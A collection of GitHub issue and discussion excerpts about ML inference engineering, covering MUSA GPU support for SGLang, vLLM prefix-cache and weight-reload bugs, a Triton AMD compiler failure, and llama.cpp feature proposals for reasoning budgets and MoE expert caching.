items.title: [Roadmap][Feature] Support Moore Threads (MUSA) GPU
items.author: yeahdongcn
items.body_excerpt:
### Checklist

- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

## Motivation

Add first-class support for [Moore Threads](https://en.mthreads.com/) (**MUSA**) GPUs in **SGLang** (including `sglang`, `sgl-kernel`, and `multimodal_gen`), enabling SGLang to run efficiently and be optimized on MTGPU hardware while minimizing disruption to existing vendor backends and preserving upstream compatibility.

## Background

[Moore Threads](https://en.mthreads.com/) **MUSA** (Meta-computing Unified System Architecture) SDK provides a CUDA-compatible execution environment together with a vendor-specific runtime and software ecosystem. This design allows many CUDA-based projects to be ported to MUSA with limited source-level changes, while still enabling vendor-specific optimizations where necessary.

The proposed integration follows a **vendor-isolated branching model**, conceptually similar to how AMD integrates ROCm support into CUDA-centric projects. This comparison is made to clarify the architectural approach and does not imply any upstream NVIDIA-specific changes or dependencies.

By explicitly isolating MUSA-specific logic while preserving CUDA fallback paths, this approach aims to maintain upstream compatibility, minimize code churn, and keep vendor-specific optimizations well-scoped and maintainable.

### Why add MUSA support to SGLang

- Enable SGLang users to run models end-to-end on MTGPU.
- Preserve a single codebase that falls back to existing CUDA implementations.
- Provide targeted MUSA-optimized kernels for operators where performance is essential.

### Related MooreThreads repos referenced in this effort

- [torch_musa](https://github.com/MooreThreads/torch_musa): PyTorch extension for MTGPU.
- [mate](https://github.com/MooreThreads/mate): MUSA AI Tensor Engine, providing high-performance kernels and APIs compatible with FlashAttention / FlashInfer–style interfaces.
- [torchada](https://github.com/MooreThreads/torchada): A lightweight adapter layer that enables CUDA-style PyTorch extensions (`CUDAExtension`, build flags, etc.) to be reused on MUSA with minimal modification.
- [mthreads-ml-py](https://github.com/MooreThreads/mthreads-ml-py): Python bindings for MTML, providing GPU discovery, monitoring, and management capabilities. Functionally similar to `pynvml` for NVIDIA platforms.

## High-level approach

- Progressive vendor-branching: Add explicit `is_musa` device detection and `forward_musa` dispatch paths in Python layers. Default to existing CUDA paths as fallback so upstream compatibility is preserved.
- Compile-time adaptation for kernels: Use `torchada` and `setup_musa.py` to adapt build flags and extension metadata to compile existing CUDA extensions for MUSA where possible. Keep the original CUDA kernels as reference.
- Targeted MUSA optimizations: For performance-critical ops, implement MUSA-specific optimized kernels (fused kernels, different tiling, different intrinsics). Only change vendor-specific code paths; keep fallback implementations intact.
- CI & packaging: Add Dockerfiles and CI matrix entries for a MUSA-enabled build (or for cross-compilation steps), plus ops tests and model-level smoke tests.

```mermaid
flowchart TB

subgraph musa_libs [MUSA Optimized Libraries]
    deepgemm[DeepGEMM]
    flash_attn_3[Flash Attention 3]
    mt_deepep[MT-DeepEP]
    mate[MATE - MUSA AI Tensor Engine]

    mate --> deepgemm
    mate --> flash_attn_3
end

subgraph sglang_stack [SGLang]
    sglang[sglang]
    srt[srt]
    custom_op[MultiPlatformOp]
    models
    multimodal_gen

    forward[forward]
    forward_musa[forward_musa]
    forward_cuda[forward_cuda]

    attention_backend[Attention Backend]
    fa3_backend[FA3 - MATE]
    triton[Triton]
    torch_native[Torch.SDPA - Torch MUSA]

    deepseek[DeepSeek]
    layer_impl[layer_impl - is_musa customization]
    others[Others]

    musa_platform[MusaPlatform]
    fa3_platform[FA3 - MATE]
    torch_sdpa[Torch.SDPA - Torch MUSA]

    sglang_kernel[sglang_kernel]
    setup_musa[setup_musa.py]
    musa_ext[MUSA extension]
    musa_ops[MUSA kernels]
    cuda_ops[CUDA kernels - ported]
    fused_ops[fused kernels - e.g. silu_and_mul]
    misc_ops[allreduce / elementwise / kvcache]

    sglang --> srt
    srt --> custom_op
    srt --> models

    custom_op --> forward
    forward --> forward_musa
    forward_musa --> forward_cuda

    srt --> attention_backend
    attention_backend --> fa3_backend
    attention_backend --> triton
    attention_backend --> torch_native

    models --> deepseek
    deepseek --> layer_impl
    models --> others

    sglang --> multimodal_gen
    multimodal_gen --> musa_platform
    musa_platform --> fa3_platform
    musa_platform --> torch_sdpa

    sglang_kernel --> setup_musa
    setup_musa --> musa_ext

    musa_ext --> musa_ops
    musa_ext --> cuda_ops

    musa_ops --> fused_ops
    cuda_ops --> misc_ops
end
```

## Representative examples

### 1) sgl-kernel: build-time adaptation (example `setup_musa.py`)

```py
# Example: minimal change to compile as a MUSA extension via torchada wrappers
import torchada  # noqa: F401
from torch.utils.cpp_extension import BuildExtension, CUDAExtension

ext_modules = [
    CUDAExtension(
        name="sgl_kernel.common_ops",
        sources=sources,
        include_dirs=include_dirs,
        extra_compile_args={
            "mcc": mcc_flags,
            "cxx": cxx_flags,
        },
        libraries=libraries,
        extra_link_args=extra_link_args,
        py_limited_api=False,
    ),
]
```

### 2) MUSA-optimized fused op

```c
// Example C++ signature for a musa-optimized fused op
void musa_fused_add_rms_norm(
    torch::Tensor &input,
    torch::Tensor &residual,
    torch::Tensor &weight,
    double epsilon);
```

items.title: GLM-5.3-Flash on 8x B200: dual TP4/EP4 serving profile with long-context measurements
items.author: stewtong
items.body_excerpt:
<!-- register: GitHub Discussion | reader: SGLang maintainers and operators | consumed: repository thread -->

I measured an SGLang serving profile for `zai-org/GLM-5.3-Flash` on one 8x NVIDIA B200 node. It uses two independent TP4/EP4 replicas, FP8 KV cache, TRT-LLM DSA backends, the FlashInfer TRT-LLM MoE runner, static NEXTN 5-1-6, and session-affine routing.

**Update, September 27:** on the pinned image, one server prefilling two 1M-token prompts together ran out of GPU memory in the sparse-attention indexer. [#40854](https://github.com/sgl-project/sglang/pull/40854) fixes this upstream, and the repository now publishes an equivalent local patch. The results below predate the patch. The September run's findings are in [this comment](https://github.com/sgl-project/sglang/discussions/37153#discussioncomment-18627772).

The pinned software stack, engine commands, proxy configuration, client setup, methods, and results are documented here: https://github.com/stewtong/b200-glm53

Validation observations:

- All 138 streaming Chat Completions requests returned HTTP 200 with the requested completion length. None timed out or returned HTTP 429.
- At concurrency 1, median end-to-end output rate including prefill was 245.3 tok/s at about 131K input tokens and 12.50 tok/s at about 1M input tokens.
- At about 524K input tokens and total concurrency 16 across both replicas, 48/48 requests completed without an observed out-of-memory error. Maximum capacity remains unmeasured.
- GSM8K scored 1,284/1,319 (97.35%) with the checkpoint's default max effort and 1,272/1,319 (96.44%) with `reasoning_effort: low`. The conditions used different output limits and are reported separately in the repository.
- In a repeated-prefix cache study with stable session affinity, median time to first output event was 3.10 seconds on turn 1 and 0.62 seconds on later turns. With a changed leading system line, the corresponding medians were 3.13 and 3.24 seconds.

The serving table and cache study used three repetitions per condition. Since September 3, the repository also publishes the benchmark harness and the request-level rows for both. The repository documents the tested boundaries and excludes unsupported aggregate throughput, decode TPOT, route-latency, and causal claims.

items.title: TritonAMDGPUBlockPingpong produces invalid TTGIR with tl.dot, dynamic loop, and runtime-selected pointer
items.author: O1iveira7
items.body_excerpt:
### Describe the bug

 A Triton matmul-style kernel fails to compile on the AMD/HIP backend during
  `make_ttgir`. The failure is triggered by a dynamic `tl.range` loop containing a
  runtime `if` that selects one of two B-matrix pointer expressions before a masked
  `tl.load`, followed by `tl.dot`.

  The failure occurs with `num_stages=2` and reports a dominance verifier error
  while executing `TritonAMDGPUBlockPingpong`:

  ```text
Traceback (most recent call last):

  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 370, in <lambda>
    return lambda *args, **kwargs: self.run(grid=grid, warmup=False, *args, **kwargs)
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 739, in run
  
    kernel = self._do_compile(key, signature, device, constexprs, options, attrs, warmup)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 884, in _do_compile
    kernel = self.compile(src, target=target, options=options.__dict__)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/compiler/compiler.py", line 327, in compile
    next_module = compile_ir(module, metadata)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 508, in <lambda>
    stages["ttgir"] = lambda src, metadata: self.make_ttgir(src, metadata, options)
                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 273, in make_ttgir
    pm.run(mod, 'make_ttgir')
RuntimeError: PassManager::run failed

PassManager::run failed
```
  The same reduced reproducer compiles successfully with num_stages=1, which
  suggests the issue is specific to the AMD block-pingpong/pipelining pass rather
  than frontend lowering or pointer canonicalization.
### Reprocuder
Run this on an AMD machine.
```
import torch
import triton
import triton.language as tl


@triton.jit
def repro_dot_dominance(
    switch_ptr,
    a,
    b,
    c,
    M,
    N,
    K,
    stride_am,
    stride_bn,
    BLOCK_M: tl.constexpr,
    BLOCK_N: tl.constexpr,
    BLOCK_K: tl.constexpr,
):
    values = tl.load(switch_ptr + tl.arange(0, 2))
    zero, one = tl.split(values)
    cond = zero > one
    m_offsets = tl.arange(0, BLOCK_M)
    k_offsets = tl.arange(0, BLOCK_K)
    acc = tl.zeros((BLOCK_M, BLOCK_K), tl.float32)

    for n in tl.range(tl.cdiv(N, BLOCK_N)):
        n_offsets = n * BLOCK_N + tl.arange(0, BLOCK_N)
        a_mask = (m_offsets[:, None] < M) & (n_offsets[None, :] < N)
        a_ptrs = a + m_offsets[:, None] * stride_am + n_offsets[None, :]
        a_block = tl.load(a_ptrs, mask=a_mask, other=0.0)

        b_mask = (n_offsets[:, None] < N) & (k_offsets[None, :] < K)
        if cond:
            b_ptrs = b + n_offsets[:, None] * stride_bn + (one * k_offsets)[None, :]
        else:
            b_ptrs = b + n_offsets[:, None] * stride_bn + k_offsets[None, :]
        b_block = tl.load(b_ptrs, mask=b_mask, other=0.0)

        acc = tl.dot(a_block, b_block, acc, allow_tf32=False)

    c_mask = (m_offsets[:, None] < M) & (k_offsets[None, :] < K)
    c_ptrs = c + m_offsets[:, None] * K + k_offsets[None, :]
    tl.store(c_ptrs, acc, mask=c_mask)


def solve(a, b, c, M: int, N: int, K: int):
    switch = torch.tensor([0, 1], dtype=torch.int32, device=a.device)
    grid = (1, 1)
    repro_dot_dominance[grid](
        switch, a, b, c, M, N, K, N, K, 32, 32, 32, num_stages=2
    )
```

### Environment details

- Triton: 3.7.1
- AMD Instinct MI308X

items.author: bakas-george
items.body_excerpt:
### Your current environment

We are using [this](https://gallery.ecr.aws/deep-learning-containers/vllm) image with 0.11.0 vLLM version and 1.7 sagemaker version:
Image URI: public.ecr.aws/deep-learning-containers/vllm:0.11.0-gpu-py312-cu128-ubuntu22.04-sagemaker-v1.7 
[Release](https://github.com/aws/deep-learning-containers/releases/tag/v1.7-vllm-sagemaker-0.11.0-gpu-py312)

We are using the default ENV values but we are also using the following:
- name: "SM_VLLM_MAX_MODEL_LEN"
  value: "12000"
- name: "SM_VLLM_LIMIT_MM_PER_PROMPT"
  value: '{"image":6, "video":0}'
- name: "SM_VLLM_MODEL"
  value: "/opt/ml/model/qwen2_W4A16"
- name: "SM_VLLM_MM_PROCESSOR_CACHE_GB"
  value: "0"

### 🐛 Describe the bug

When serving QWEN2-2B with vLLM on AWS SageMaker (g6e.xlarge, 32GB RAM), we see persistent CPU RAM growth leading to container restarts during normal inference workloads. This occurs regardless of cache configuration (--mm-processor-cache-type SHM/LRU, with default or custom --mm-processor-cache-gb, and with cache entirely disabled).

* RAM Usage: Memory usage increases steadily with requests (seen with both 4GB and 8GB cache values) and RAM is not freed post-inference.
* Container Restarts: Endpoint server restarts around 60–65% total RAM consumed.
* Model Choice: Reproduced with QWEN2-2B (multimodal enabled) and text-only pipelines.
* vLLM Version: We are using the latest stable release.

Expected:
RAM usage should remain stable or return to baseline when requests complete and cache limits are not reached.


Prior Investigation:

Searched and reviewed existing issues ([example issues #12973, #15085, #8629](https://github.com/vllm-project/vllm/issues?q=memory+leak)).

The problem appears to affect small models and different cache modes (SHM, LRU, etc.).

Occurs even with mm_processor_cache_gb set to minimal values.

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: [RFC] Weight Reload Correctness for RL
items.author: aoshen02
items.body_excerpt:
**Related RFCs:** [#54477](https://github.com/vllm-project/vllm/issues/54477) (reload refactor), [#45585](https://github.com/vllm-project/vllm/issues/45585) (RL CI roadmap), [#48310](https://github.com/vllm-project/vllm/issues/48310) (sleep/wake correctness), [#48305](https://github.com/vllm-project/vllm/issues/48305) (training-inference consistency), and [#48478](https://github.com/vllm-project/vllm/issues/48478) (production fail-closed storage contract for category 1).

## Problem

Weight reload must produce correct inference output for all model architectures and parallelism configurations. The cases below span vLLM and downstream RL integrations.

This RFC classifies failures by root cause rather than symptom. A single bug may violate more than one invariant, but each item is tracked under its primary category. Repeated layerwise copy-back, post-load, and completion failures motivate the direct-mode refactor in [#54477](https://github.com/vllm-project/vllm/issues/54477); that refactor must satisfy the invariants here rather than replace their acceptance tests.

## Scope

In scope: model/adapter weight load and reload, post-load transformations, reload state restoration, parameter routing, weight-name resolution, and cache invalidation caused by a model or adapter update.

This tracker owns the update half of the complete RL transition:

```text
pause/drain -> sleep -> wake(weights) -> reload/update -> post-load/finalize
            -> wake(kv_cache) -> invalidate versioned caches -> resume
```

The sleep/wake half is tracked in #48310. A successful RL update must satisfy both RFCs; HTTP success alone is not a correctness oracle.

## Failure taxonomy

| # | Category | Required invariant | Minimum regression check |
|---|---|---|---|
| 1 | Storage identity | A tensor address captured by CUDA/HIP Graph or retained by a backend must not change across reload | capture → reload → pointer check → allocation pressure → replay |
| 2 | Runtime value refresh | Every runtime-derived tensor must be recomputed from the new source weight and refreshed in place | load A → post-load → load B → post-load → check derived values/output |
| 3 | Loader lifecycle | A weight loader must remain valid for the parameter's current layout and lifecycle phase; accounting must finalize each layer exactly once and only after every required tensor arrives | load A → layout/kernel setup → load B; vary transfer order/chunking and check exact completion accounting |
| 4 | Reload state preservation | Parameters, buffers, configuration, and backend state required by forward must survive or be rebuilt correctly | compare cold load with warm reload across all runtime state |
| 5 | Parameter routing/sharding | Every checkpoint tensor must be written to the correct parameter, TP rank, and shard | multi-rank load with rank-distinct sentinel values |
| 6 | Name/key mapping | Checkpoint, model, and adapter names must resolve completely and unambiguously | bidirectional key-coverage test; no silent missing/unexpected keys |
| 7 | Post-update cache coherence | Any cache derived from model/adapter version N must either be invalidated or keyed by a new identity before version N+1 serves requests | warm cache on A → update to B → reuse the same request → assert the cache path is exercised and the result matches cold-cache B |

## 1. Storage identity

This category covers long-lived runtime tensors whose device addresses are captured by a graph or retained by a backend. The first post-load pass may bind storage; every subsequent reload must reuse compatible storage. Shape/dtype/device/layout incompatibility must fail explicitly instead of silently replacing it.

### Confirmed

| Tracking | Component | Failure | Status |
|---|---|---|---|
| [#49789](https://github.com/vllm-project/vllm/pull/49789) | Graph-visible runtime state | Register and preserve backend-owned tensors across reload | Open |
| [#50521](https://github.com/vllm-project/vllm/pull/50521) | FlashInfer CUTLASS MoE | Keep captured expert constants in stable storage | Open |
| [#50538](https://github.com/vllm-project/vllm/pull/50538) | FlashInfer B12x MoE | Preserve runtime tensors outside parameter copy-back | Open |
| [#56570](https://github.com/vllm-project/vllm/pull/56570) | FlashInfer TRTLLM BF16 MoE | Update weights without replacing graph-visible storage | Open |
| [#48539](https://github.com/vllm-project/vllm/pull/48539) | Machete act-order permutation | `act_perm` captured a fresh unregistered permutation during every post-load pass. H100 validation found 88/88 pointers rebound; capture artifacts retained the old storage, producing a silent stale read rather than a dangling-pointer crash | Open fix; live red/green validated |
| [Live H100 evidence](https://github.com/vllm-project/vllm/issues/48312#issuecomment-4964191093) | FlashInfer CUTLASS MoE SwiGLU constants | Rebuilding the experts object replaced `gemm1_alpha`, `gemm1_beta`, and `gemm1_clamp_limit`; 72/72 graph-visible tensors moved and all capture-time storages expired on gpt-oss-20b | Confirmed; fix required |

### High-risk candidates

Audited against upstream `main@83762b77`. Static inspection confirms that these paths create or rebind long-lived tensors used by forward; supported-hardware replay is still required before classifying them as reproduced bugs.

| Candidate | Risk | Needed validation |
|---|---|---|
| [AITER MLA FP4/FP8 derived weights](https://github.com/vllm-project/vllm/blob/83762b77b07e97c77f986e4bf5a9474952e47bb3/vllm/model_executor/layers/attention/mla_attention.py#L903-L925) | Every post-load rebuilds `W_K`, `W_K_scale`, `W_V`, and `W_V_scale`; decode passes them directly to AITER BMM kernels | AMD HIP Graph capture → level-2 sleep/wake → reload → replay |
| [FlashInfer B12x MoE runtime scales](https://github.com/vllm-project/vllm/blob/83762b77b07e97c77f986e4bf5a9474952e47bb3/vllm/model_executor/layers/fused_moe/experts/flashinfer_b12x_moe.py#L120-L157) | `_fc2_input_scale`, `w1_sf_m

### 🐛 Describe the bug **Summary.** `--enable-prefix-caching` together with MTP speculative decoding still corrupts output on hybrid (GDN/Mamba) Qwen3.5-class models in **v0.28.0**. A small fraction of responses degenerate into repeated punctuation (`!!!!…`) or come back empty. This is the same failure as #43559, which was closed as completed on 2026-08-06 — the merged scheduler-side fix (#51113) does not cover it, and the cache-manager-side fixes (#43650, #48375) are still open. **Model.** Qwen3.5-architecture dense 27B VLM (`Qwen3_5ForConditionalGeneration`, hybrid: Gated DeltaNet linear-attention layers + full attention every 4th layer, vision tower), FP8 W8A8 compressed-tensors (`FP8_DYNAMIC`), with an MTP head present in the checkpoint (`Qwen3_5MTP` resolves at startup). TP=1, single H100. **Server command** (paths redacted): ```bash export VLLM_NO_USAGE_STATS=1 export VLLM_USE_FLASHINFER_SAMPLER=0 vllm serve \ --served-model-name path-mini \ --port 8000 \ --max-model-len 62768 \ --max-num-seqs 32 \ --gpu-memory-utilization 0.95 \ --enable-chunked-prefill \ --limit-mm-per-prompt.image 10 \ --enable-prefix-caching \ --mamba-cache-mode align \ --speculative-config '{"method": "mtp", "num_speculative_tokens": 2}' ``` Startup confirms the configuration: `Resolved architecture: Qwen3_5MTP`, `enable_prefix_caching=True`, `num_spec_tokens=2`, `GPU KV cache size: 576,637 tokens`, attention block size 800 (forced up to match the mamba page size), async scheduling enabled (default). **Workload.** Multi-step GUI-agent traces: each request is a conversation of prior steps plus 1–3 screenshots (sliding 2-image history), ~4k–12k prompt tokens, ~20–100 output tokens, `temperature=0`, client concurrency up to 32. Consecutive steps of the same episode share a long prefix, so prefix-cache hit rate climbs through a run. **Observed.** | vLLM | prefix caching | MTP | final prefix-cache hit rate | malformed responses | |---|---|---|---|---| | 0.26.0 | on | k=2 | 27.5% | 25 / 2,636 (0.95%) | | **0.28.0** | **on** | **k=2** | **31.7%** | **4 / 495 (0.81%)** | | 0.28.0 | on | k=2, `--kv-cache-dtype fp8` | ~10% (see note) | 0 / 1,135 | Malformed = response is a run of repeated `!` characters, or empty content. `finish_reason` is normal; no HTTP 5xx, no crash, no traceback — the engine stays healthy and every other response in the same run is correct. Two observations that point at the prefix cache rather than at MTP alone: 1. **Rate tracks cache hit rate.** Corruption appears only once the prefix cache starts hitting, and scales with the hit rate. 2. **`--kv-cache-dtype fp8` appears to avoid it, but only by destroying the cache.** With fp8 KV, vLLM raises the attention block size 800 → 1600 (`platforms/interface.py`, so that one attention page covers one mamba page). Our requests share ~1,700 tokens of prefix, so at a 1600-token matching unit almost nothing is reusable: hit rate collapses from 31.7% to ~10%, and malformed responses go to 0/1,135. That is consistent with reduced exposure, not with fp8 fixing the underlying defect. (For the same reason `--block-size 800` cannot be used to compensate: the value is derived and only ever raised.) **Suspected cause** (already described in #43650 / #48375): `MambaManager.find_longest_cache_hit` in `vllm/v1/core/single_type_kv_cache_manager.py` accepts `drop_eagle_block` and never acts on it, so the final matched block — which can hold recurrent state written over draft positions that verification later rejected — stays reachable through the prefix cache and is reused by subsequent requests sharing that prefix. `FullAttentionManager` drops that block. In v0.28.0 the caller (`kv_cache_coordinator.py`) additionally skips the eagle margin for `MambaSpec` with the comment *"its finder never drops"*, i.e. caller and manager disagree about who is responsible. Applying **#43650** (6 lines, `max_num_blocks -= 1` when `use_eagle`) on top of v0.28.0 starts cleanly and shows no regression on an unrelated accuracy check (100 grounding requests at concurrency 32: 76% vs 75% unpatched, identical coor

items.title: [Bug] DeepSeek-V4-Flash tool-call format failures associated with prefix-cache reuse; worst for short cached head + long uncached suffix; `cache_salt` reduces failures but is confounded with hit shape (v0.27.1, fp8 KV, MTP)
items.author: kukjun
items.body_excerpt:
## Summary

Intermittent tool-call formatting failures with DeepSeek-V4-Flash on vLLM v0.27.1 (fp8 KV cache, prefix caching, MTP speculative decoding), observed over ~3 weeks in an agentic workload.

What we measured, in decreasing order of confidence:

1. **Failures were concentrated on requests that reused prefix cache, and were replica-local.** Production first turns with `cache_read_input_tokens = 0` had 0 failures in two pre-mitigation samples (0 / 83 and 0 / 67), but cold requests were not failure-free everywhere: 2 / 83 in direct replays (both no-tool class, 0 strict) and 3 / 59 among post-mitigation cold first turns. The same request set on two replicas at the same time: 0 / 35 vs 17 / 19.
2. **Among cache-reading first turns, failure rate depended strongly on hit shape.** Same day, same tool set, thinking enabled, before mitigation, both replicas pooled: hit of only the ~3.6k-token shared tool-schema head followed by 40–70k uncached prompt tokens failed **41 / 65 (63%)**; hit of >30k tokens with a short uncached suffix failed **22 / 96 (23%)**. On the one replica with enough data: 23 / 34 vs 5 / 38.
3. **A dedicated `cache_salt` namespace reduced failures** (direct replay 0 / 37 vs 44 / 55; production first turns 35/138 → 3/203 after the change). But in our replay design the salted requests were all long hits over blocks the replay itself had written cold, and the unsalted ones were head-only hits over shared blocks. **The comparison therefore confounds three variables — hit shape, the computation path of the blocks being read (cold-computed vs. computed on top of a hit), and replica state — and does not isolate any of them.**

An earlier hypothesis of ours (cached head blocks drifting through repeated rewrites on top of partial hits) was tested against logs and **not supported**: first turns that read the shared head within 10 minutes of an observed cold recomputation of that prefix still failed 33 / 82. It is not excluded, because we have no per-block lineage instrumentation.

We do not know the mechanism. This report lists the observations, the checks, the confounds we could not remove, and the experiment we would run.

## Environment

- vLLM **v0.27.1**, torch 2.13.0, transformers 5.15.0
- Model: **DeepSeek-V4-Flash** (fp8 weights; fp4 experts via the MARLIN MXFP4 backend on SM90). Exact checkpoint revision not recorded.
- Two independent replicas, each **8 × H100 80GB, TP=8**, no KV sharing between replicas. Identical settings:
  - `--kv-cache-dtype fp8`
  - `--speculative-config '{"method":"deepseek_mtp","num_speculative_tokens":1}'`
  - `--compilation-config '{"cudagraph_mode":"PIECEWISE"}'`
  - `--max-model-len 524288`, `--reasoning-parser deepseek_v4`, `--enable-auto-tool-choice` with a custom tool parser plugin (a fallback parser that also rescues some non-DSML tool syntax)
  - prefix caching enabled (default), chunked prefill 8,192, block size 256, `prefix_caching_hash_algo=sha256`, async scheduling enabled (default)
- Attention path: FlashMLA sparse fp8 kernels, indexer top-k 512. Engine startup lists five KV-cache groups (compressed KV C4A/C128A, SWA KV, compressor state, indexer KV).
- Sampling: the client omits `temperature`/`top_p`. We did not verify the effective values on the server (checkpoint `generation_config.json` or server overrides). No temperature-0 comparison was run.
- **Production path:** application → gateway → load balancer → vLLM native Anthropic `/v1/messages`, streaming, thinking enabled, 16–18 tools, first-turn prompts 40k–75k tokens. Requests with the same tool set share a ~3.6k-token prefix (tool schemas), so first-turn `cache_read_input_tokens` is typically exactly 3,584 (16-tool set) or 4,608 (18-tool set), or 0.
- **Replay path:** requests converted with vLLM's own Anthropic→chat conversion and sent directly to each replica's `/v1/chat/completions` (bypassing the load balancer), `return_token_ids` requested. Prompt **token counts** matched the original requests in 123 / 123 replays; token-ID-level equality of the rendered prompt was not checked. Format classification was made on the response content after `</think>` (DSML tags visible as text in the content). Whether the classification code used returned output token IDs or the content string is not recoverable from the logs we still hold.

## Failure definition

A thinking-enabled request with tools is counted as failed when any of:

- **dialect** — the text contains a non-DSML tool-call syntax (`<tool_call>`, `<function …>`, `<｜DSML｜tool name=…>`, …) and the response has no `tool_use` block;
- **rescued** — `stop_reason = tool_use` but no `tool_use` block (the fallback parser rescued a non-DSML call; the Anthropic stream converter then dropped the id-less tool call — see below). The underlying output was non-DSML;
- **no-tool** — `stop_reason = end_turn` with no `tool_use` block on a first turn (≤3 messages).

The no-tool class is workload-specific: in this agent the first turn is expected to act through tools, and inspected cases end with text announcing an action ("I'll check … first") without calling anything. We cannot rule out that some are legitimate text answers, so every table below also gives the **strict** count (dialect + rescued only). A cache-free canary request run periodically against the same replicas scored 0.6% under the full definition. Gateway-side labels and the independently computed labels used here agreed on 2,120 / 2,120 joined records.

## Observed behavior

Text is otherwise coherent (no garbage tokens, no unexpected CJK). In inspected failures the visible deviation starts at the first token after `</think>`; this identifies the visible symptom, not the first point where internal state differed.

Rates varied widely across windows: ~0.01% in quiet periods; hourly first-turn failure median 0.0% (47 h) before an incident vs 13.8% (43 h, max 52%) during it. Failures dropped to ~0 immediately after restarting an affected replica; on another occasion they declined w

items.title: Feature Request: Graceful reasoning budget termination. Avoid mid-sentence cutoff.
items.author: CleStil
items.body_excerpt:
### Prerequisites

- [x] I am running the latest code. Mention the version if possible as well.
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

PR #20297 (merged ~2025-03-11) added `--reasoning-budget-message`, which injects
a string at the hard token cutoff to signal the model to wrap up. The injection
still happens at exactly token N with zero warning. The model gets no time to
finish its current thought before the `</think>` boundary.

Graceful termination before the cutoff is expected to improve reasoning
performance. See Motivation and Possible Implementation for details.


### Motivation

Raw truncation of the thinking trace measurably reduces answer quality compared
to graceful termination. Muennighoff et al. (s1: Simple test-time scaling,
arXiv:2501.19393) showed that appending an end-of-thinking delimiter with
"Final Answer:" before the hard cut outperforms naïve truncation. This was
confirmed by follow-up work (arXiv:2505.05315), which states directly that
"the S1 approach performs better than directly truncating the full reasoning
trajectory, underscoring the importance of preserving the solution segment."

The current --reasoning-budget-message implementation injects a wrap-up message
at exactly token N, leaving the model zero tokens to actually act on it. This is
functionally equivalent to truncation with a cosmetic suffix — the model cannot
produce a meaningful conclusion within 0 remaining tokens.

### Possible Implementation

Three approaches in increasing complexity:

Option A — message offset
Inject the budget message at `budget - offset` instead of `budget`, giving the
model `offset` tokens to act on the wrap-up signal. The s1 paper
(https://arxiv.org/abs/2501.19393) shows this outperforms raw truncation.
Change in the COUNTING state of reasoning-budget.cpp:

    if (ctx->remaining <= ctx->warn_offset)  // was: <= 0

Files: reasoning-budget.cpp, reasoning-budget.h, common.h, arg.cpp,
sampling.cpp. Default 0 preserves current behavior.

Option B — separate budgeting
Split total budget into thinking (t) and conclusion (s) phases, t + s = budget.
Force `</think>` at token t, leave s tokens for a conclusion before the answer.
Follow-up work on s1 (https://arxiv.org/abs/2505.05315) shows this outperforms
the basic offset approach. Would add a second parameter, e.g.
--reasoning-budget-conclusion M.

Option C — logit biasing toward `</think>`
Ramp up the logit weight of `</think>` as the budget runs low, then force it at
the hard limit. No dependency on an injected phrase, model-agnostic. NVIDIA NIM
uses this approach with a 10% extension window for sentence completion. More
invasive (sampler changes) but cleanest long-term.

Options A and B build on the existing message injection architecture. Option C
is a parallel approach that could coexist with either.

Happy to test on ROCm/gfx1100 (Qwen3.5-27B) and contribute a draft of Option A
or B if there is interest.

items.title: RFC: MoE expert cache, VRAM caching of hot CPU-resident experts with hybrid hit/miss execution
items.author: leloch
items.body_excerpt:
*Follow-up to #24524, which was closed as too large to review — @am17an suggested
an RFC laying out the benefits vs the maintenance burden, and explicitly suggested
having the AI draft it. So, full disclosure: this document and the code it
describes were predominantly generated by an AI (Anthropic's Claude Fable 5),
working under my direction on my hardware. Code: [`leloch:moe-cache-pr`](https://github.com/ggml-org/llama.cpp/compare/master...leloch:llama.cpp:moe-cache-pr).*

## Problem

When a MoE model spills experts to system RAM (`--cpu-moe` / `--n-cpu-moe` /
auto-fit), decode is dominated by the CPU reading expert weights at RAM
bandwidth while the GPUs idle. Prior attempts (#20757, #21609, #21614, #21620,
#23170) all moved MUL_MAT_ID to the GPU and tried to make the weight copies
cheaper. That puts every cache miss on the critical path as a synchronous PCIe
transfer: @batot1 measured ~3× decode regression from forced decode offload
without residency (#20757), and the Metal slot-pool experiment in the same
thread was 2× slower than vanilla even at 97–99% hit rate, purely from
per-layer sync points. #23170's post-mortem concluded the staging-buffer
approach is a no-op when made correct, and that the fix is a separate
persistent expert-cache buffer with explicit expert→slot bookkeeping.

On the discussions side, #22584 proposes the static version of this idea
(offline expert profiling + strategic placement), #19030 and PR #21067 the
prefetch version (latency-hiding without residency), and #22183 asks the
placement question a runtime cache answers automatically ("use the idle fast
device for experts") — but no runtime expert cache has been proposed as an
RFC before.

## Proposed design

That persistent buffer, plus an inverted execution model: **MUL_MAT_ID stays on
the CPU.** Inside the CPU kernel, thread 0 dispatches one batched matvec over
the cached (hit) rows on the GPU while the other threads compute the miss rows
as they normally would. Misses cost nothing extra, hit rate is pure upside,
worst case degrades to the vanilla CPU path. Fill is decode-only (prompt
routing is far flatter and thrashes the cache); decode routing is skewed
enough to make this work — measured on Qwen3.5-122B, the top 10% of experts
take ~80% of hits (independent corroboration in #20757: Gini ≈ 0.76, ~99%
